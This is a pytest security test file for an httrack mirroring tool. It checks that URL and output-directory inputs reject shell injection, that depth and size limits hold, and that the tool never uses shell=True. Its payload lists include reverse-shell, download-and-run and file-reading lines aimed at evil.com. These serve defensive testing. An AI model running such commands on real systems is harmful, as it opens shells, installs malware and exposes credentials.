"""Security tests for httrack_mirror: command injection and input validation.

These tests verify that shell metacharacters in httrack inputs are rejected
before reaching subprocess execution. Defense-in-depth: the primary protection
is never using shell=True, but explicit input validation is the second layer.
"""
from __future__ import annotations

from contextlib import asynccontextmanager
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from tengu.exceptions import InvalidInputError
from tengu.security.sanitizer import sanitize_url

TOOL_MODULE = "tengu.tools.recon.httrack"

SHELL_INJECTION_PAYLOADS = [
    "; ls -la",
    "& id",
    "| cat /etc/passwd",
    "`whoami`",
    "$(cat /etc/shadow)",
    "; rm -rf /tmp/*",
    "&& curl http://evil.com/shell.sh | bash",
    "|| id",
    "\n/bin/sh",
    "; nc -e /bin/sh evil.com 4444",
    "$(curl http://evil.com/malware -o /tmp/m && chmod +x /tmp/m && /tmp/m)",
    "> /dev/null; id",
    "1 --flag $(id)",
]

OUTPUT_DIR_INJECTION_PAYLOADS = [
    "/tmp/site; rm -rf /tmp/*",
    "/tmp/site && id",
    "/tmp/site`whoami`",
    "/tmp/$(id)",
    "/tmp/site\n/bin/sh",
]


class TestHttrackURLInjection:
    """Ensure malicious URLs are rejected by sanitize_url before reaching httrack."""

    @pytest.mark.parametrize("payload", SHELL_INJECTION_PAYLOADS)
    def test_url_rejects_shell_injection(self, payload: str):
        injected = f"http://example.com/{payload}"
        with pytest.raises(InvalidInputError):
            sanitize_url(injected)


class TestHttrackOutputDirInjection:
    """Ensure malicious output_dir values are sanitized before use."""

    @pytest.mark.parametrize("payload", OUTPUT_DIR_INJECTION_PAYLOADS)
    def test_output_dir_injection_chars_stripped(self, payload: str):
        from tengu.tools.recon.httrack import _sanitize_output_dir
        result = _sanitize_output_dir(payload)
        # The result must never contain shell metacharacters
        for char in (";", "&", "|", "`", "$", "\n", ">", "<", "(", ")"):
            assert char not in result, f"Char '{char}' found in sanitized dir: {result!r}"

    def test_output_dir_absolute_path_traversal_blocked(self):
        from tengu.tools.recon.httrack import _sanitize_output_dir
        result = _sanitize_output_dir("../../etc/passwd")
        # Must fall back to default since it doesn't start with /tmp/ or /home/
        assert result == "/tmp/httrack"

    def test_output_dir_null_byte_rejected(self):
        from tengu.tools.recon.httrack import _sanitize_output_dir
        result = _sanitize_output_dir("/tmp/site\x00evil")
        assert "\x00" not in result


class TestHttrackDepthBounds:
    """Depth parameter must be bounded regardless of user input."""

    @pytest.mark.parametrize("depth,expected", [
        (0, 1),
        (-1, 1),
        (-999, 1),
        (1, 1),
        (5, 5),
        (6, 5),
        (100, 5),
        (999999, 5),
    ])
    def test_depth_clamped(self, depth: int, expected: int):
        """Depth is clamped in 1–5 range by the tool before building args."""
        from tengu.tools.recon.httrack import _MAX_DEPTH

        clamped = max(1, min(depth, _MAX_DEPTH))
        assert clamped == expected


class TestHttrackMaxSizeBounds:
    """max_size must be bounded to prevent runaway downloads."""

    @pytest.mark.parametrize("size_mb,expected", [
        (0, 1),
        (-1, 1),
        (100, 100),
        (500, 500),
        (501, 500),
        (999999, 500),
    ])
    def test_max_size_clamped(self, size_mb: int, expected: int):
        from tengu.tools.recon.httrack import _MAX_SIZE_MB

        clamped = max(1, min(size_mb, _MAX_SIZE_MB))
        assert clamped == expected


class TestHttrackNeverUsesShell:
    """Verify the tool never invokes shell=True."""

    async def test_run_command_called_not_shell(self):
        """run_command is called with a list (not a shell string)."""

        def _make_rate_limited_mock():
            mock_rl = MagicMock()

            @asynccontextmanager
            async def _fake(*args, **kwargs):
                yield

            mock_rl.side_effect = _fake
            return mock_rl

        ctx = MagicMock()
        ctx.report_progress = AsyncMock()
        cfg = MagicMock()
        cfg.tools.defaults.scan_timeout = 300
        audit = MagicMock()
        audit.log_tool_call = AsyncMock()
        audit.log_target_blocked = AsyncMock()
        allowlist = MagicMock()
        allowlist.check.return_value = None

        run_mock = AsyncMock(return_value=("", "", 0))

        with (
            patch(f"{TOOL_MODULE}.get_config", return_value=cfg),
            patch(f"{TOOL_MODULE}.get_audit_logger", return_value=audit),
            patch(f"{TOOL_MODULE}.make_allowlist_from_config", return_value=allowlist),
            patch(f"{TOOL_MODULE}.resolve_tool_path", return_value="/usr/bin/httrack"),
            patch(f"{TOOL_MODULE}.sanitize_url", side_effect=lambda u: u),
            patch(f"{TOOL_MODULE}.run_command", new=run_mock),
            patch(f"{TOOL_MODULE}.rate_limited", new=_make_rate_limited_mock()),
            patch(f"{TOOL_MODULE}._count_files_by_type", return_value={}),
            patch(f"{TOOL_MODULE}._find_interesting", return_value=[]),
            patch(f"{TOOL_MODULE}._dir_size_mb", return_value=0.0),
        ):
            from tengu.tools.recon.httrack import httrack_mirror
            await httrack_mirror(ctx, "http://example.com")

        # run_command must have been called with a list as first argument
        call_args = run_mock.call_args
        cmd = call_args[0][0] if call_args[0] else call_args.kwargs.get("args")
        assert isinstance(cmd, list), "run_command must be called with a list, not a shell string"
